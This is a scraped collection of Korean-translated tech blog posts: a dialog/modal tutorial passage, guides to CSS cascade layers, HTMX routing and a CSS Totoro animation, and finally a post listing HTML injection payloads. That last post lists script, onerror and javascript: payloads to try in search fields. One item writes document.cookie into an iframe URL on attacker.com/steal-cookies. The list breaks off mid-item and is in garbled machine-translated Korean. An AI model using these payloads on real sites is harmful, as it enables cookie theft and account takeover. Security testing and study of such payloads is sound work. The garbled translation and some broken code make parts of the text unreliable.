페이지의 나머지 콘텐츠를 비활성화하는 것입니다.\n\n모달의 예시는 다음과 같을 수 있습니다:\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n```js\n\u003c!-- Modal - HTML --\u003e\n\u003cdialog id=\"modal\"\u003e\n  \u003ch1\u003e이것은 모달입니다.\u003c/h1\u003e\n  \u003cbutton id=\"closeModal\"\u003e모달 닫기\u003c/button\u003e\n\u003c/dialog\u003e\n\u003cbutton id=\"openModal\"\u003e모달 보이기\u003c/button\u003e\n```\n\n```js\n// Modal - JavaScript\nconst modal = document.getElementById(\"modal\");\nconst openModal = document.getElementById(\"openModal\");\nconst closeModal = document.getElementById(\"closeModal\");\n\nopenModal.addEventListener(\"click\", () =\u003e {\n  modal.showModal();\n});\n\ncloseModal.addEventListener(\"click\", () =\u003e {\n  modal.close();\n});\n```\n\n다이얼로그 예시는 다음과 같을 수 있습니다:\n\n```js\n\u003c!-- Dialog - HTML --\u003e\n\u003cdialog id=\"dialog\"\u003e\n  \u003ch1\u003e이것은 다이얼로그입니다.\u003c/h1\u003e\n  \u003cbutton id=\"closeDialog\"\u003e다이얼로그 닫기\u003c/button\u003e\n\u003c/dialog\u003e\n\u003cbutton id=\"openDialog\"\u003e다이얼로그 보이기\u003c/button\u003e\n```\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n```js\n// 다이얼로그 - JavaScript\nconst dialog = document.getElementById(\"dialog\");\nconst openDialog = document.getElementById(\"openDialog\");\nconst closeDialog = document.getElementById(\"closeDialog\");\n\nopenDialog.addEventListener(\"click\", () =\u003e {\n  dialog.show();\n});\n\ncloseDialog.addEventListener(\"click\", () =\u003e {\n  dialog.close();\n});\n```\n\n두 가지 사이의 유일한 차이점은 그들을 열기 위한 함수입니다. 모달의 경우 showModal() 메소드를 사용해야 하고 간단한 다이얼로그의 경우 show()를 사용해야 합니다. 코드의 나머지 부분은 동일합니다.\n\n`dialog`은 보이는 다이얼로그를 보여주는 open 속성이 있습니다 (설정된 경우). 예를 들어:\n\n```js\n\u003cdialog open\u003e\n  \u003ch1\u003eThis dialog will always be shown.\u003c/h1\u003e\n\u003c/dialog\u003e\n```\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n표시를 켜거나 끄기 위해 true/false로 설정할 수도 있습니다 (예를 들어 React의 useState와 함께 사용할 수 있습니다). 그러나 이 경우에는 항상 비모달(non-modal)로 설정되므로 showModal()/show() 메서드를 사용하는 것이 좋습니다.\n\nReact에서 이 작업을 수행하는 한 가지 방법은 useEffect와 useRef를 사용하는 것입니다:\n\n```js\n// Modal을 별도의 컴포넌트로 만들기\nimport { useEffect, useRef } from \"react\";\n\nfunction Modal({ openModal, closeModal, children }) {\n  const ref = useRef();\n\n  useEffect(() =\u003e {\n    if (openModal) {\n      ref.current?.showModal();\n    } else {\n      ref.current?.close();\n    }\n  }, [openModal]);\n\n  return (\n    \u003cdialog\n      ref={ref}\n      onCancel={closeModal}\n    \u003e\n      {children}\n      \u003cbutton onClick={closeModal}\u003e\n        닫기\n      \u003c/button\u003e\n    \u003c/dialog\u003e\n  );\n}\n\nexport default MenuModal;\n```\n\n여기서 useRef는 렌더링 용도로 값을 참조하고, useEffect는 열기/닫기 상태를 확인하는 데 사용됩니다(이는 props를 통해 전달됩니다). 또한 올바르게 ESC 키를 사용하기 위해 onCancel 속성도 있습니다(키보드로 모달을 닫으려는 경우 사용할 수 있습니다).\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n그럼 모달 구성 요소를 페이지 구성 요소에 추가하고 useState로 상태를 설정해야 합니다. 모달을 열거나 닫으려면 다음을 추가하십시오:\n\n```js\n// 페이지 구성 요소\nimport { useState } from \"react\";\nimport { Modal } from \"./Modal\";\n\nfunction PageComponent() {\n  const [modal, setModal] = useState(false);\n\n  return (\n    \u003cbutton\n      onClick={() =\u003e setModal(true)}\n    \u003e\n      모달 열기\n    \u003c/button\u003e\n    \u003cModal\n      openModal={modal}\n      closeModal={() =\u003e setModal(false)}\n    \u003e\n      모달 내용.\n    \u003c/Modal\u003e\n  )\n\nexport default PageComponent;\n```\n\n위의 React 예시에서 showModal() 메서드를 show()로 변경하면 모달 대신 간단한 대화상자를 사용합니다. 이 경우 대화상자를 기타 요소 위에 표시하려는 경우 CSS 파일에서 z-index를 추가로 설정해야 할 수 있습니다 (대화상자가 열렸을 때 다른 요소에 접근할 수 있게 합니다).\n\nCSS에 대한 추가 설정으로는 모달에 대한 ::backdrop 가상 요소를 설정하는 것이 있습니다. 예를 들어 배경을 어둡게 하려면 (기본 변형보다 더 어둡게) 다음과 같이 설정할 수 있습니다:\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n```js\n.modalClassName::backdrop {\n  background: rgba(0, 0, 0, 0.5);\n}\n```\n\n다음은 `dialog` 요소를 사용하는 몇 가지 가능한 방법입니다. `div`와 같은 변종을 사용하는 대신 모달/대화 상자에 적절한 태그를 가지고 있는 것은 좋은 점이지만 물론 항상 다른 접근 방식이 있습니다.\n\n읽어 주셔서 감사합니다.\n","ogImage":{"url":"/assets/img/2024-05-02-ModalswithHTMLdialogelementinJavaScriptandReact_0.png"},"coverImage":"/assets/img/2024-05-02-ModalswithHTMLdialogelementinJavaScriptandReact_0.png","tag":["Tech"],"readingTime":4},{"title":"CSS 캐스케이드 레이어: 새로운 CSS 기능에 대한 가이드(2024년)","description":"","date":"2024-05-02 00:05","slug":"2024-05-02-CSSCascadeLayersThebestguidetothenewCSSfeature","content":"\n\n![sandwich](/assets/img/2024-05-02-CSSCascadeLayersThebestguidetothenewCSSfeature_0.png)\n\n샌드위치를 상상해보세요. 샌드위치는 여러 가지 재료가 서로 층을 이루듯 쌓여져 있습니다. 상추, 토마토, 패티, 소스, 치즈. 각 재료는 전체 샌드위치에 중요하며 추가될 때마다 그 맛이 달라집니다. 맨 위에 추가된 재료의 우선순위가 다른 모든 재료를 압도합니다. 따라서 샌드위치를 섭취하는 경우 치즈, 소스, 패티, 토마토, 그리고 상추의 맛을 느낄 것입니다.\n\nCSS 캐스케이드 레이어도 마찬가지입니다. 각 CSS 레이어에는 요소 선택기에 적용되는 특정한 명시도가 있습니다. 특정 레이어가 특정 레이어 뒤에 나타날 경우, 이전 요소의 선택기보다 더 높은 명시도를 가진 동일한 요소에 대해서도 이전 레이어의 명시도를 무시합니다. 3개의 레이어가 있는 경우 어떤 CSS 스타일이 적용될지 이해하기 위해 아래 다이어그램을 살펴보세요.\n\n![CSS Cascade Layers](/assets/img/2024-05-02-CSSCascadeLayersThebestguidetothenewCSSfeature_1.png)\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n위의 이미지에서, 3개의 층이 서로 겹쳐져 있습니다. 첫 번째 층은 Layer 1이 처음에 나타나고, Layer 3은 가장 아래에 나타납니다. 샌드위치 비유에 따르면, Layer 1은 샌드위치의 밑바닥(상추)에 있고, Layer 3은 위쪽(치즈)에 있습니다. 여기서 div 요소에 대한 고도의 선택자를 가지고 있는 Layer 1과 Layer 2도 있지만, 적용되는 최종 스타일은 Layer 3의 것입니다. 이것은 카스케이딩의 원리에 따라 작동합니다.\n\nCSS 레이어는 CSS 파일에서 @layer를 사용하여 정의할 수 있습니다. 단일 파일 내에서 여러 개의 카스케이드 레이어가 있는 경우, @layer를 사용하여 레이어 우선 순위 순서를 정의할 수 있습니다. 즉, base, utilities, component의 우선 순위 순서를 정의하는 것입니다. 이것은 base가 가장 낮은 우선 순위를 가지고 component가 가장 높은 우선 순위를 가진다는 것을 말합니다. HTML 요소에 적용되는 스타일의 순서는 먼저 base, 그 다음에 utilities, 마지막으로 component입니다. 아래 코드를 확인해보세요:\n\nHTML\n\n```js\n\u003cp class=\"alert\"\u003e좀비에 주의하세요\u003c/p\u003e\n```  \n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\nCSS\n\n```js\n@layer base, utilities;\n\n@layer utilities {\n  .alert {\n    background-color: brown;\n  }\n  p {\n    border: medium solid limegreen;\n  }\n}\n\n@layer base {\n  .alert {\n    border: medium solid violet;\n    background-color: yellow;\n    color: white;\n  }\n}\n```\n\n결과\n\n\u003cimg src=\"/assets/img/2024-05-02-CSSCascadeLayersThebestguidetothenewCSSfeature_2.png\" /\u003e\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n위의 코드에서 우리는 우선순위 순서가 명확히 정의되어 있음을 볼 수 있습니다. 가장 높은 우선순위는 유틸리티에게 주어지며, 첫 번째 줄의 레이어 목록에서 맨 뒤에 나타납니다. 그 다음으로 스타일은 아래 형식을 사용하여 레이어 내에 정의할 수 있습니다:\n\n```js\n@layer LAYER_NAME {\n// 여기에 스타일 규칙을 작성하세요\n}\n\n@layer LAYER_NAME {\n// 여기에 스타일 규칙을 작성하세요\n}\n```\n\n레이어는 개발자가 파일 맨 위에 요소에 레이어가 적용되어야 하는 우선순위를 이미 정의했기 때문에 임의의 순서로 정의할 수 있습니다.\n\n계층 내의 스타일 규칙은 함께 적용됩니다. 이것은 CSS에서 캐스케이딩에 대해 더 세부적인 제어를 개발자에게 제공합니다.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n## 익명 캐스케이드 레이어\n\n레이어 외에 있는 모든 스타일 규칙은 익명 레이어로 묶이고 이 익명 레이어는 모든 정의된 레이어보다 높은 우선순위를 갖습니다. 예를 들어 아래와 같이 구성할 수 있습니다. \n\n```css\n@layer utilities {\n  .alert {\n    background-color: brown;\n  }\n  p {\n    border: medium solid limegreen;\n  }\n}\n\n@layer base {\n  .alert {\n    border: medium solid violet;\n    background-color: yellow;\n    color: white;\n  }\n}\n\n.alert {\n  background-color: red;\n}\n```\n\n위의 경우, 출력 결과는 아래와 같습니다:\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n\\[이미지\\]\\(/assets/img/2024-05-02-CSSCascadeLayersThebestguidetothenewCSSfeature_3.png\\)  \n\n한 번 레이어 순서가 정해지면 특이성과 나타나는 순서는 무시됩니다. CSS 캐스케이드 레이어의 이 기능을 통해 개발자들은 더 간단한 선택자를 만들 수 있습니다. 더 이상 특이성을 무효화해야 하는 곳에 해킹이나 치트를 찾을 필요가 없어졌습니다.\n\n익명 캐스케이드 레이어는 레이어를 만들되 이름을 할당하지 않음으로써 만들 수 있습니다:\n\n```js\n@layer {\n  p {\n    margin-block: 1rem;\n  }\n}\n```\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n## 스타일 규칙을 레이어로 가져오기\n\n개발자들은 다른 CSS 모듈 파일을 가져와서 레이어에 할당할 수 있습니다. 예를 들어,\n\n```js\n@import \"theme.css\" layer(utilities);\n```\n\n위 예시에서 theme.css 파일의 내용이나 스타일 규칙이 utilities 레이어에 할당됩니다.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n## 중첩 레이어\n\n레이어는 아래 형식을 사용하여 중첩될 수 있습니다:\n\n```js\n@layer framework {\n  @layer layout {\n  }\n}\n```\n\n새로운 스타일 규칙은 다음 형식을 사용하여 레이아웃 레이어에 추가할 수 있습니다. 즉, 부모 레이어와 자식 레이어 사이에 . 을 추가하는 것입니다:\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n```js\n@layer framework.layout {\n  p {\n    margin-block: 1rem;\n  }\n}\n```\n\n## 브라우저 호환성\n\n@layer와 이 기능의 브라우저 호환성이 매우 뛰어나며 요즘에는 널리 사용됩니다.\n\n![이미지](/assets/img/2024-05-02-CSSCascadeLayersThebestguidetothenewCSSfeature_4.png)\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n이 기사가 도움이 되었으면 좋겣아. 이 기사를 CSS 친구들이나 웹 개발에 관심 있는 친구들과 공유해 주시면 감사하겠어요. 제 Medium 블로그를 구독하고 이 기사를 좋아요를 눌러주세요. @layer의 사용 사례를 댓글 섹션에 언급해 주세요.\n\n# 간단하게 설명 🚀\n\nIn Plain English 커뮤니티의 일원이 되어 주셔서 감사합니다! 떠나시기 전에:\n\n- 반드시 박수를 치고 작가를 팔로우해 주세요 ️👏️️\n- 우리를 팔로우하세요: X | LinkedIn | YouTube | Discord | Newsletter\n- 다른 플랫폼에서 저희를 방문해보세요: Stackademic | CoFeed | Venture | Cubed\n- PlainEnglish.io에서 더 많은 콘텐츠를 확인하세요","ogImage":{"url":"/assets/img/2024-05-02-CSSCascadeLayersThebestguidetothenewCSSfeature_0.png"},"coverImage":"/assets/img/2024-05-02-CSSCascadeLayersThebestguidetothenewCSSfeature_0.png","tag":["Tech"],"readingTime":4},{"title":"HTMX를 활용해 쉬운 페이지 라우팅하기","description":"","date":"2024-05-02 00:04","slug":"2024-05-02-EffortlessPageRoutingUsingHTMX","content":"\n\n![이미지](/assets/img/2024-05-02-EffortlessPageRoutingUsingHTMX_0.png)\n\n리액트는 종종 웹 애플리케이션에 지나치게 많은 요소를 포함하고 있을 수 있으며, HTMX와 함께 웹 서버만 사용하여 상호 작용 애플리케이션을 만드는 것이 동등한 결과를 얻을 수 있는 경우가 있습니다.\n\n이 블로그 포스트에서는 HTMX를 활용하여 상호 작용이 가능하고 화면 깜빡임이 없는 페이지 이동을 작성하는 방법을 설명하겠습니다:\n\n## 서버 설정\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n```js\nmkdir no-react-app \ncd no-react-app\nnpm init -y\nnpm install express nunjucks\n```\n\n그런 다음 서버 파일을 만들고 실행합니다.\n\n```js\n//File: app.js\nconst express = require(\"express\")\nconst app = express()\n\nconst nunjucks = require('nunjucks');\nnunjucks.configure(\"views\", {\n    autoescape: true,\n    express: app\n});\n\napp.get(\"/\", (req, res) =\u003e {\n    res.render(\"pages/home.html\")\n})\n\napp.get(\"/users\", (req, res) =\u003e {\n    res.render(\"pages/users.html\")\n})\n\napp.get(\"/posts\", (req, res) =\u003e {\n    res.render(\"pages/posts.html\")\n})\n\napp.listen(3000, () =\u003e {\n    console.info(`Application running http://localhost:3000`)\n})\n```\n\n저희는 템플릿 엔진으로 nunjucks를 사용합니다. 모든 템플릿, 레이아웃 및 부분 파일은 \"views\" 디렉토리에 저장됩니다. 따라서 프로젝트 구조는 다음과 같을 것입니다.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n## 앱 구조\n\n```js\napp.js\nviews\n  layouts\n    main.html\n  partials\n    sidenav.html\n  pages\n    user.html\n    home.html\n    posts.html\n```\n\n템플릿 엔진을 사용하기 때문에 모든 뷰가 확장할 레이아웃을 추가합시다.\n\n## 메인 레이아웃\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n```js\n\u003c!--File: views/layouts/main.html--\u003e\n\u003c!DOCTYPE html\u003e\n\u003chtml lang=\"en\"\u003e\n\u003chead\u003e\n    \u003cmeta charset=\"UTF-8\"\u003e\n    \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"\u003e\n    \u003clink rel=\"stylesheet\"\n        href=\"https://cdnjs.cloudflare.com/ajax/libs/tailwindcss/2.0.2/tailwind.min.css\" /\u003e\n    \u003ctitle\u003eHTMX App\u003c/title\u003e\n\u003c/head\u003e\n\n\u003cbody class=\"bg-gray-200\"\u003e\n    \u003cdiv class=\"flex h-screen\"\u003e\n        \u003c!-- Side Navigation --\u003e\n        {- include('partials/sidenav.html')}\n\n        \u003c!-- Main Content Area --\u003e\n        \u003cdiv class=\"w-full bg-white p-4\" id=\"main\"\u003e\n            { block content }{ endblock }\n        \u003c/div\u003e\n\u003c/body\u003e\n\n\u003c/html\u003e\n``` \n\nsidenav 템플릿 컴포넌트를 partials로 리팩터링하여 레이아웃에 포함했습니다.\n\n## Side Nav Component\n\n```js\n\u003c!--File: views/partials/sidenav.html--\u003e\n\u003cdiv class=\"w-56 bg-gray-800 text-white p-4\"\u003e\n    \u003ca href=\"/\" class=\"block py-2 px-4 text-white hover:bg-gray-600\"\u003eHome\u003c/a\u003e\n    \u003ca href=\"/users\" class=\"block py-2 px-4 text-white hover:bg-gray-600\"\u003eUsers\u003c/a\u003e\n    \u003ca href=\"/posts\" class=\"block py-2 px-4 text-white hover:bg-gray-600\"\u003ePosts\u003c/a\u003e\n\u003c/div\u003e\n```\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n그리고 우리는 메인 페이지인 home.html, users.html 및 posts.html을 만들었습니다.\n\n## 페이지\n\n```js\n\u003c!--views/pages/home.html--\u003e\n{ extends 'layouts/main.html' }\n\n{ block content }\n\u003ch1 class=\"text-2xl font-bold mb-4\"\u003eHTMX Nav\u003c/h1\u003e\n{ endblock }\n```\n\n```js\n\u003c!--views/pages/users.html--\u003e\n{ extends 'layouts/main.html' }\n\n{ block content }\n\u003ch1 class=\"text-2xl font-bold mb-4\"\u003eUsers\u003c/h1\u003e\n{ endblock }\n```\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n```js\n\u003c!-- views/pages/posts.html --\u003e\n{ extends 'layouts/main.html' }\n\n{ block content }\n\u003ch1 class=\"text-2xl font-bold mb-4\"\u003ePosts\u003c/h1\u003e\n{ endblock }\n```\n\n서버를 실행하면 네비게이션이 있지만 전체 페이지가 다시 로드됩니다:\n\n\u003cimg src=\"https://miro.medium.com/v2/resize:fit:1400/1*yPvQ3Jj47osdFfxsoMXqSg.gif\" /\u003e\n\nHTMX라는 가벼운 JavaScript 라이브러리를 사용하여 이 문제를 해결해야 합니다. 이 라이브러리는 보다 더 순조롭고 상호작용적인 사용자 네비게이션 경험을 크게 향상시킬 수 있습니다. HTMX는 더 다양한 응용 프로그램에서 사용할 수 있지만, 현재 목적에 맞게 더 원활한 네비게이션을 달성하기 위해 그 능력을 활용하는 데 중점을 둘 것입니다.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n## HTMX를 사용하여 점진적으로 향상시키기\n\nHTMX를 사용하는 가장 빠른 방법은 CDN을 통해 로드하는 것입니다. 다음 코드를 head 태그에 추가하면 간단히 시작할 수 있습니다:\n\n```js\n\u003c!--File: views/layouts/main.html--\u003e\n...\n\u003cscript src=\"https://unpkg.com/htmx.org@latest\"\u003e\u003c/script\u003e\n\u003ctitle\u003eHTMX App\u003c/title\u003e\n\u003c/head\u003e\n...\n```\n\n이제 사이드네비게이션 바에 작은 변경을 가할 수 있습니다.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n- href 속성을 제거하고 hx-get 속성으로 대체합니다. 사용자가이 링크를 클릭하면 HTTP GET 요청이 발생합니다.\n- 각 앵커에 hx-target 속성을 추가하거나 앵커 상위 div에 하나 추가하십시오. hx-target 속성을 사용하면 응답을 교체할 요소를 대상으로 지정할 수 있습니다.\n- 각 앵커에 hx-push-url=\"true\"를 추가하십시오. hx-push-url 속성을 사용하면 URL을 브라우저 위치 기록에 추가할 수 있습니다. 이를 통해 새로운 기록 항목이 생성되어 브라우저의 뒤로/앞으로 버튼을 사용한 탐색이 가능합니다.\n\n이것이 무엇을 하는가: 우리는 \"main\" id의 div에서 응답을 삽입할 때 HTMX lib에 서버 호출을 만드는 방법을 선언적으로 지시하고 있습니다.\n\n```js\n\u003cdiv class=\"w-56 bg-gray-800 text-white p-4\" hx-target=\"#main\"\u003e\n    \u003ca hx-get=\"/\" hx-push-url=\"true\" class=\"block py-2 px-4 text-white hover:bg-gray-600\"\u003eHome\u003c/a\u003e\n    \u003ca hx-get=\"/users\" hx-push-url=\"true\" class=\"block py-2 px-4 text-white hover:bg-gray-600\"\u003eUsers\u003c/a\u003e\n    \u003ca hx-get=\"/posts\" hx-push-url=\"true\" class=\"block py-2 px-4 text-white hover:bg-gray-600\"\u003ePosts\u003c/a\u003e\n\u003c/div\u003e\n```\n\n이제 다음과 같습니다.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n![image](https://miro.medium.com/v2/resize:fit:1400/1*LOvL_BdO8v6B-La18uqJug.gif)\n\n번쩍임 문제를 해결했고 새로운 URL로 올바르게 전환됩니다. 이제 다른 사람에게 내비게이션을 공유하고 싶다면 새로운 URL로 이동하게 됩니다.\n\n### 앱을 HTMX 알아보기\n\n각 서버 요청이 HTMX 호출인지 여부를 결정해야 합니다. 만약 HTMX 호출이라면 레이아웃을 사용하지 말고 해당 템플릿의 HTML을 그대로 반환하도록 템플릿 엔진에 지시해야 합니다. 이를 위해 특정 미들웨어를 포함해야 합니다:\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n```js\n// 파일: app.js\n...\napp.use((req, res, next) =\u003e {\n    res.locals.useLayout = req.headers[\"hx-request\"] !== \"true\";\n    next();\n})\n\napp.listen(3000, () =\u003e {\n    console.info(`애플리케이션이 http://localhost:3000에서 실행 중입니다.`)\n})\n```\n\nHTMX 요청이 감지되지 않는 경우에만 레이아웃을 사용합니다.\n\n```js\n\u003c!-- 파일: views/layouts/main.html --\u003e\n{ if useLayout }\n\u003c!DOCTYPE html\u003e\n\u003chtml lang=\"en\"\u003e\n\n\u003chead\u003e\n    \u003cmeta charset=\"UTF-8\"\u003e\n    \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"\u003e\n    \u003clink rel=\"stylesheet\"\n        href=\"https://cdnjs.cloudflare.com/ajax/libs/tailwindcss/2.0.2/tailwind.min.css\" /\u003e\n    \u003cscript src=\"https://unpkg.com/htmx.org@latest\"\u003e\u003c/script\u003e\n    \u003ctitle\u003eHTMX App\u003c/title\u003e\n\u003c/head\u003e\n\u003cbody class=\"bg-gray-200\"\u003e\n    \u003cdiv class=\"flex h-screen\"\u003e\n        \u003c!-- Side Navigation --\u003e\n        {- include('partials/sidenav.html')}\n        \u003c!-- Main Content Area --\u003e\n        \u003cdiv class=\"w-full bg-white p-4\" id=\"main\"\u003e\n{ endif }\n\n            { block content }{ endblock }\n\n{ if useLayout }\n        \u003c/div\u003e\n\u003c/body\u003e\n\u003c/html\u003e\n{ endif }\n```\n\nURL을 공유할 수 있도록 원활하고 번쩍임 없는 내비게이션 경험을 성공적으로 달성했습니다.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n[이미지](https://miro.medium.com/v2/resize:fit:1400/1*hdhwN-9D2qdkYFyXwJ6XEg.gif)\n\n원본 블로그 게시물: [https://nanosoft.co.za/blog/post/express-htmx](https://nanosoft.co.za/blog/post/express-htmx)\n\n소스 코드: [https://github.com/nanosoftonline/express-htmx](https://github.com/nanosoftonline/express-htmx)","ogImage":{"url":"/assets/img/2024-05-02-EffortlessPageRoutingUsingHTMX_0.png"},"coverImage":"/assets/img/2024-05-02-EffortlessPageRoutingUsingHTMX_0.png","tag":["Tech"],"readingTime":7},{"title":"HTML과 CSS를 사용하여 애니메이션으로 뛰는 토토로 만들기","description":"","date":"2024-05-02 00:03","slug":"2024-05-02-BuildinganAnimatedJumpingTotoroUsingHTMLandCSS","content":"\n\n![이미지](https://miro.medium.com/v2/resize:fit:1200/1*DQhfTbm3hP_-igEhkhk4Hw.gif)\n\n스튜디오 지브리의 매력을 웹 개발 여정에 더해볼준비가 되셨나요? 오늘의 프로젝트에서는 사랑받는 영화 \"이웃의 토토로\"의 상징적 캐릭터에서 영감을 받아 애니메이션된 점프하는 토토로를 만들어볼 것입니다. 이 프로젝트는 #100DaysOfCode 챌린지 22일차의 일환으로, HTML, CSS 및 소량의 애니메이션 마법으로 프론트엔드 개발을 탐험하는 과정입니다. 시작해봅시다!\n\n# 단계 1: 프로젝트 설정하기\n\n시작하기 전에, 제공된 링크에서 전체 소스 코드를 다운로드했는지 확인해주세요: 소스 코드 다운로드. 다운로드가 완료되면, 새 프로젝트 디렉토리를 생성하고 소스 코드 파일을 추출하세요.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n# 단계 2: 구조 이해하기\n\n코드 에디터에서 프로젝트 파일을 열어보세요. 여기에는 HTML, CSS 및 필요에 따라 JavaScript 파일이 포함되어 있을 겁니다. 다양한 파일이 어떻게 연결되어 있는지 이해해보세요.\n\n# 단계 3: HTML 마크업\n\nindex.html 파일을 열어보세요. 이곳에서 우리의 웹 페이지 구조를 정의합니다. HTML 마크업에는 컨테이너, 토토로의 몸통 부분(귀, 눈, 코 등) 및 애니메이션 클래스 등 다양한 요소가 포함되어 있습니다.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n# 단계 4: CSS로 스타일링하기\n\nstyle.css 파일에서 당신은 당신의 토토로에 생명을 불어넣는 스타일을 찾을 수 있습니다. CSS에는 위치, 크기, 색상 및 애니메이션 키프레임이 포함되어 뛰는 효과를 만듭니다. 각 CSS 규칙은 특정 요소나 애니메이션 속성에 해당합니다.\n\n# 단계 5: 애니메이션 추가하기\n\nstyle.css 파일에 정의된 CSS 애니메이션 키프레임을 살펴보세요. 이러한 키프레임은 토토로의 몸통, 귀, 수염 및 그림자의 움직임과 압축 효과를 제어합니다. 원하는 효과를 달성하기 위해 애니메이션 지속 시간, 타이밍, 그리고 이징을 실험해보세요.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n# 단계 6: 테스트 및 디버깅\n\n수정을 완료한 후 인덱스.html 파일을 웹 브라우저에서 열어 애니메이션을 테스트하세요. 브라우저의 개발자 도구를 사용하여 요소를 검사하고 CSS 문제를 디버깅하며 애니메이션 매개변수를 세밀하게 조정하세요.\n\n# 단계 7: 튜닝 및 사용자 정의\n\n원하는 대로 토토로 디자인, 색상 및 애니메이션을 사용자 정의하세요. 토토로의 몸통 부분의 크기, 위치, 모양을 조절하거나 전체적인 모습을 향상시키기 위해 추가 요소를 추가할 수도 있습니다.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n# 단계 8: 당신의 작품 공유하기\n\n애니메이션으로 뛰어오르는 토토로에 만족하셨다면, 소셜 미디어나 코드 공유 플랫폼에 프로젝트를 공유해 다른 사람들을 영감을 주고 코딩 스킬을 과시해보세요. 또한 이 프로젝트를 만들면서 느낀 경험을 나누며 동료 개발자들과 연결할 수도 있어요. 이것이 #100DaysOfCode 챌린지의 22일차를 완료한 것을 축하합니다!\n\n애니메이션으로 뛰어오르는 토토로를 만들면서 프론트엔드 개발 스킬을 키우는 동시에 코딩 여정에 신비로운 터치를 불어넣었어요. 계속해서 코딩을 하며 창작을 이어가고 영감을 받아보세요! 궁금한 점이 있거나 경험을 공유하고 싶다면 언제든지 Bento에서 저와 연락하실 수 있어요.\n\n행복한 코딩 하세요! 🚀✨","ogImage":{"url":"/assets/img/2024-05-02-BuildinganAnimatedJumpingTotoroUsingHTMLandCSS_0.png"},"coverImage":"/assets/img/2024-05-02-BuildinganAnimatedJumpingTotoroUsingHTMLandCSS_0.png","tag":["Tech"],"readingTime":2},{"title":"HTML 삽입 (페이로드 목록)","description":"","date":"2024-05-02 00:01","slug":"2024-05-02-HTMLINJECTIONPayloadList","content":"\n\n피신몽인 사람들, 다시 돌아\n\n주사, 이제 페이로드 목록을 가져 오는 것을 보여드리고, 검색 패널에서 시도해 볼 수 있으며, 그대로 반영될 수 있습니다 \u0026 저장되면 위험할 수도 있습니다,\n\n이제 같은 것에 대해 몇 가지 기본 사항을 살펴보겠습니다. HTML 주입이 무엇인지 알아보기 위해\n아스타 타커\nHTML 주입 또는 주입 관련 질문에 대해, 바로 코드만 제공해 드릴게요. 이것을 시도해서 혜택을 얻어보세요..... \n\n\n![HTML INJECTION Payload List](/assets/img/2024-05-02-HTMLINJECTIONPayloadList_0.png)\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n페이로드 목록을 확인해 보세요...\n\n물론이죠! 저장된 및 반사된 HTML 주입 페이로드 100개를 모두 포함한 목록입니다:\n\n저장된 HTML 주입 페이로드:\n1. `script`alert(‘저장된 HTML 주입’)`/script`\n2. `img src=\"javascript:alert(‘저장된 HTML 주입’)\"`\n3. `svg/onload=alert(‘저장된 HTML 주입’)`\n4. `iframe src=\"javascript:alert(‘저장된 HTML 주입’)\"`\n5. `body onload=alert(‘저장된 HTML 주입’)`\n6. `img src=x onerror=alert(‘저장된 HTML 주입’)`\n7. `marquee onstart=alert(‘저장된 HTML 주입’)`\n8. `input type=\"image\" src=\"javascript:alert(‘저장된 HTML 주입’)\"`\n9. `img src=1 href=1 onerror=alert(‘저장된 HTML 주입’) /`\n10. `input type=\"hidden\" onkeypress=\"alert(‘저장된 HTML 주입’)\"`\n11. `audio onloadstart=\"alert(‘저장된 HTML 주입’)\"`\n12. `form onsubmit=\"alert(‘저장된 HTML 주입’)\"`\n13. `textarea onchange=\"alert(‘저장된 HTML 주입’)\"`\n14. `base href=\"javascript:alert(‘저장된 HTML 주입’)\"`\n15. `a href=\"javascript:alert(‘저장된 HTML 주입’)\"`여기를 클릭하세요`/a`\n16. `object data=\"javascript:alert(‘저장된 HTML 주입’)\"`\n17. `img src=\"x\" onmouseover=\"alert(‘저장된 HTML 주입’)\"`\n18. `script`document.write(‘`iframe src=\"https://attacker.com/steal-cookies?cookie=` + document.cookie + ‘\"``/iframe`’);`/script`\n19. `body background=\"javascript:alert(‘저장된 HTML 주입’)\"`\n20. `embed src=\"javascript:alert(‘저장된 HTML 주입’)\"`\n21. `script`alert(‘반사된 HTML 주입’)`/script`\n22. `img src=\"javascript:alert(‘반사된 HTML 주입’)\"`\n23. `svg/onload=alert(‘반사된 HTML 주입’)`\n24. `iframe src=\"javascript:alert(‘반사된 HTML 주입’)\"`\n25. `body onload=alert(‘반사된 HTML 주입’)`\n26. `img src=x onerror=alert(‘반사된 HTML 주입’)`\n27. `marquee onstart=alert(‘반사된 HTML 주입’)`\n28. `input type=\"image\" 